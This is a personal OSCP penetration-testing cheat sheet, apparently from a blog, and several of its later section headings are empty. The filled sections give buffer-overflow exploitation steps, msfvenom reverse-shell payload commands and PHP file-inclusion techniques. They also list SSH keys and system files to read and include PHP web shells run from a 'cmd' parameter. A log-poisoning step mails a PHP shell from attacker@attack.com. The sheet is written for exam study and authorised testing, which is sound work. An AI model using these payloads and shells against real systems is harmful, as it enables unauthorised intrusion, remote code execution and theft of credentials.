---
title: OSCP CheatSheet
tags: OSCP
key: 20190516
---

Just some oscp cheat sheet stuff that I customized for myself. It may look messy, I just use it to copy the command I needed easily.

The content in this [repo](https://github.com/xMilkPowderx/OSCP) is not meant to be a full list of commands that you will need in OSCP. It rather just a list of commands that I found them useful with a few notes on them.

## Buffer Overflow

**1. Check buffer length to trigger overflow**  

**2. Cofirm overflow length, append "A" * length**  

**3. Generate Offset to check EIP, ESP location**
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

Record value on EIP, select ESP and click "Follow in Dump"  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> -l <length>  

Use !mona to find the offset after the overflow  
!mona findmsp  
```
**4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode**

**5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
```
Add code:

badchar = [0x00]
for ch in range (0x00 , 0xFF+1):
	if ch not in badchar:
		<payload> += chr(ch)
```
**6. Find JMP ESP address in the system.**
```
JMP ESP = FFE4

!mona jmp -r esp -cpb "\x00\x0A" << bad character

!mona modules
!mona find -s "\xff\xe4" -m brainpan.exe

check the value of the address by naviate to it.
Set breakpoint
Change "B" in EIP to the address of JMP ESP << littile edian

e.g. 0x311712f3 >> "\xf3\x12\x17\x31"

Run again to check is the breakpoint triggered
```
**7. Add shellcode**
```
Add a few \x90 before shellcode to avoid shellcode being modify

msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
```
**Bonus: Running out of shell code space?**
Use the front of payload instead
1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

JMP EAX/EBX/ECX/EDX
```
3. Append the address as shell code.
4. Add payload to the front


## File Inclusion

[Exploiting PHP File Inclusion – Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

### Local File inclusion
```php
$file = $_GET['page'];
require($file);
```
check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
```
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d
```
.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper
```
expect://<command>  
```
page=php://input&cmd=ls  
in POST request  
```php
<?php echo shell_exec($GET_['cmd']);?>  
```
Upload Zip shell file and extract with zip
```
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  
```
Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning
[HTTPD Default Layout](https://wiki.apache.org/httpd/DistrosDefaultLayout)

**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ
[shell via LFI - proc/self/environ method](https://www.exploit-db.com/papers/12886/)

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log
```
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  
```
## Remote File Inclusion
These two setting must be enabled to let RLI happens
requires allow_url_fopen=On and allow_url_include=On  
```php
$incfile = $_REQUEST["file"];  
include($incfile.".php");  
```

## File Transfer

## File upload

## Interesting files

## Reverse shell

## SQL injection

## Privilege Escalation
